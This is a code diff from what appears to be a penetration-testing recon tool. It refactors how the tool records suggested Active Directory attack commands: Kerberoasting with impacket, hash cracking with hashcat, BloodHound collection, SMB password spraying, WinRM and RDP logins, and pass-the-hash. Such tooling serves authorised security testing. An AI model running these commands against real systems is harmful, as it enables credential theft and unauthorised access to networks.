@@ -335,48 +335,47 @@ def _inject_credential_correlation(ldap_dir: Path, session, log) -> None:
 
     # Kerberoasting — must have valid credentials, but any domain user works
     if domain and 88 in open_ports:
-        session.add_note(
-            f"[MANUAL] Kerberoast (needs ANY valid domain creds): "
+        kerb_cmd = (
             f"impacket-GetUserSPNs {domain}/<USER>:<PASS> -dc-ip {ip} "
             f"-request -outputfile {ldap_dir}/kerberoast_hashes.txt"
         )
-        session.add_note(
-            f"[MANUAL] Crack Kerberoast hashes: "
+        crack_kerb = (
             f"hashcat -m 13100 {ldap_dir}/kerberoast_hashes.txt "
             f"/usr/share/wordlists/rockyou.txt"
         )
+        session.add_note(f"[MANUAL] Kerberoast (needs ANY valid domain creds): {kerb_cmd}")
+        session.add_note(f"[MANUAL] Crack Kerberoast hashes: {crack_kerb}")
+        session.add_manual_command(kerb_cmd,   "Kerberoast — extract TGS hashes for offline cracking")
+        session.add_manual_command(crack_kerb, "Crack Kerberoast TGS hashes offline")
 
     # BloodHound collection — map the entire AD graph
     if session.info.is_domain_controller and domain:
-        session.add_note(
-            f"[MANUAL] BloodHound collection (once ANY creds found): "
-            f"bloodhound-python -u <USER> -p <PASS> -d {domain} -ns {ip} -c All"
-        )
+        bh_cmd = f"bloodhound-python -u <USER> -p <PASS> -d {domain} -ns {ip} -c All"
+        session.add_note(f"[MANUAL] BloodHound collection (once ANY creds found): {bh_cmd}")
+        session.add_manual_command(bh_cmd, "BloodHound collection — map full AD attack paths")
 
     # Per-service spray with confirmed LDAP userlist
     if 445 in open_ports or 139 in open_ports:
-        session.add_note(
-            f"[MANUAL] Spray LDAP users against SMB: "
+        smb_spray = (
             f"crackmapexec smb {ip} -u {uf} "
             f"-p /usr/share/wordlists/rockyou.txt --no-bruteforce --continue-on-success"
         )
+        session.add_note(f"[MANUAL] Spray LDAP users against SMB: {smb_spray}")
+        session.add_manual_command(smb_spray, "Spray LDAP user list against SMB")
     if 5985 in open_ports or 5986 in open_ports:
-        session.add_note(
-            f"[MANUAL] WinRM access test (once creds found): "
-            f"evil-winrm -i {ip} -u <USER> -p <PASS>"
-        )
+        winrm_cmd = f"evil-winrm -i {ip} -u <USER> -p <PASS>"
+        session.add_note(f"[MANUAL] WinRM access test (once creds found): {winrm_cmd}")
+        session.add_manual_command(winrm_cmd, "WinRM shell with found credentials")
     if 3389 in open_ports:
-        session.add_note(
-            f"[MANUAL] RDP access test: "
-            f"xfreerdp /v:{ip} /u:<USER> /p:<PASS> /cert-ignore"
-        )
+        rdp_cmd = f"xfreerdp /v:{ip} /u:<USER> /p:<PASS> /cert-ignore"
+        session.add_note(f"[MANUAL] RDP access test: {rdp_cmd}")
+        session.add_manual_command(rdp_cmd, "RDP login test with found credentials")
 
     # Pass-the-Hash reminder if the target is Windows
     if session.info.os_type == "Windows":
-        session.add_note(
-            f"[MANUAL] Pass-the-Hash (once NTLM hash obtained): "
-            f"crackmapexec smb {ip} -u <USER> -H <NTLM_HASH> --continue-on-success"
-        )
+        pth_cmd = f"crackmapexec smb {ip} -u <USER> -H <NTLM_HASH> --continue-on-success"
+        session.add_note(f"[MANUAL] Pass-the-Hash (once NTLM hash obtained): {pth_cmd}")
+        session.add_manual_command(pth_cmd, "Pass-the-Hash with obtained NTLM hash")
 
 
 def _check_for_existing_hash_files(ldap_dir: Path, session, log) -> None:  # IMP-5 applied
